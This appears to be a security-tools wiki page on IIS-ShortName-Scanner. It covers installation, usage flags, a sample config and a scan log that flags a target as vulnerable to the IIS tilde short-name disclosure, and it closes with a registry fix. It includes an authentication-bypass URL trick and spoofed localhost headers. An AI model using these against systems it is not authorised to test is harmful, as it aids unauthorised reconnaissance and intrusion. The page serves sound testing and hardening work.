---
title : "IIS-ShortName-Scanner"
# pre : ' '
description : "Scanner for IIS Tilde vulnerability."
date : 2020-03-13T22:10:55+01:00
# hidden : true
# draft : true
weight : 890
tags : ['Other', 'IIS']
---

---

Scanner for IIS Tilde vulnerability.

## NOTE

Also check [tilde_enum]({{< ref "tilde-enum" >}}).

## Installation

```plain
git clone https://github.com/irsdl/IIS-ShortName-Scanner.git
```

## Usage

```plain
java -jar iis_shortname_scanner.jar 2 20 <url>
```

## Flags

```plain
USAGE 1 (To verify if the target is vulnerable with the default config file):
 java -jar IIS_shortname_scanner.jar [URL]


USAGE 2 (To find 8.3 file names with the default config file):
 java -jar IIS_shortname_scanner.jar [ShowProgress] [ThreadNumbers] [URL]


USAGE 3 (To verify if the target is vulnerable with a new config file):
 java -jar IIS_shortname_scanner.jar [URL] [configFile]


USAGE 4 (To find 8.3 file names with a new config file):
 java -jar IIS_shortname_scanner.jar [ShowProgress] [ThreadNumbers] [URL] [configFile]

DETAILS:
 [ShowProgress]: 0= Show final results only - 1= Show final results step by step  - 2= Show Progress
 [ThreadNumbers]: 0= No thread - Integer Number = Number of concurrent threads [be careful about IIS Denial of Service]
 [URL]: A complete URL - starts with http/https protocol
 [configFile]: path to a new config file which is based on config.xml


- Example 0 (to see if the target is vulnerable):
 java -jar IIS_shortname_scanner.jar http://example.com/folder/

- Example 1 (uses no thread - very slow):
 java -jar IIS_shortname_scanner.jar 2 0 http://example.com/folder/new%20folder/

- Example 2 (uses 20 threads - recommended):
 java -jar IIS_shortname_scanner.jar 2 20 http://example.com/folder/new%20folder/

- Example 3 (saves output in a text file):
 java -jar IIS_shortname_scanner.jar 0 20 http://example.com/folder/new%20folder/ > c:\results.txt

- Example 4 (bypasses IIS basic authentication):
 java -jar IIS_shortname_scanner.jar 2 20 http://example.com/folder/AuthNeeded:$I30:$Index_Allocation/

- Example 5 (using a new config file):
 java -jar IIS_shortname_scanner.jar 2 20 http://example.com/folder/ newconfig.xml
```

## Examples

```plain
java -jar iis_shortname_scanner.jar 2 20 <target>

magicFileName: *~1*
requestMethodDelimiter: ,
requestMethod: DEBUG,OPTIONS,GET,POST,HEAD,TRACE
nameStartsWith:
extStartsWith:
hassleFree: true
cookies: IIS_Tilde_Scanner=1;
outputFile: iis_shortname_scanner_logfile.txt
proxyServerName:
acceptableDifferenceLengthBetweenResponses: 10
proxyServerPort:
magicFinalPartList: \a.aspx,\a.asp,/a.aspx,/a.asp,/a.shtml,/a.asmx,/a.ashx,/a.config,/a.php,/a.jpg,/webresource.axd,/a.xxx
headersDelimiter: @@
saveOutput: false
maxNumericalPart: 3
headers: X-Forwarded-For: 127.0.0.1@@X-Originating-IP: 127.0.0.1@@X-Cluster-Client-Ip: 127.0.0.1
useProvidedURLWithoutChange: false
debug: false
maxConnectionTimeOut: 20000
magicFinalPartDelimiter: ,
forceNumericalPart: 1
userAgent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/534.10 (KHTML, like Gecko) Chrome/8.0.552.215 Safari/534.10
inScopeCharacters: ETAONRISHDLFCMUGYPWBVKJXQZ0123456789_-$~()&!#%'@^`{}
asteriskSymbol: *
showActualNames: true
maxRetryTimes: 10
maxDelayAfterEachRequest: 1
magicFileExtension: *
URLSuffix: ?&aspxerrorpath=/
questionMarkSymbol: ?

-- Current Configuration -- Begin
Scan Mode: ALL
Number of threads: 20
Config file: config.xml
Scanner version: 2.3.9 (05 February 2017)
-- Current Configuration -- End
Max delay after each request in milliseconds = 1
No proxy has been used.

Scanning...

Testing request method: "DEBUG" with magic part: "\a.aspx" ...
WARNING: An illegal reflective access operation has occurred
WARNING: Illegal reflective access by IISShortNameScanner.IIS_ShortName_Scanner (file:/iis_shortname_scanner.jar) to field sun.net.www.protocol.https.HttpsURLConnectionImpl.delegate
WARNING: Please consider reporting this to the maintainers of IISShortNameScanner.IIS_ShortName_Scanner
WARNING: Use --illegal-access=warn to enable warnings of further illegal reflective access operations
WARNING: All illegal access operations will be denied in a future release
Dir: ASPNET~1

# IIS Short Name (8.3) Scanner version 2.3.9 (05 February 2017) - scan initiated 2020/03/13 22:11:54
Target: <target>
|_ Result: Vulnerable!
|_ Used HTTP method: DEBUG
|_ Suffix (magic part): \a.aspx
|_ Extra information:
  |_ Number of sent requests: 197
  |_ Identified directories: 1
    |_ ASPNET~1
  |_ Indentified files: 0

Finished in: 2 second(s)
```

### Solution to this issue

```plain
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\FileSystem\NtfsDisable8dot3NameCreation
Change value from 0 to 1
```

## URL List

- [GitHub.com - IIS Shortname Scanner](https://github.com/irsdl/IIS-ShortName-Scanner)
- [Microsoft.com - How to disable 8.3 file name creation on NTFS partitions](https://support.microsoft.com/en-us/help/121007/how-to-disable-8-3-file-name-creation-on-ntfs-partitions)
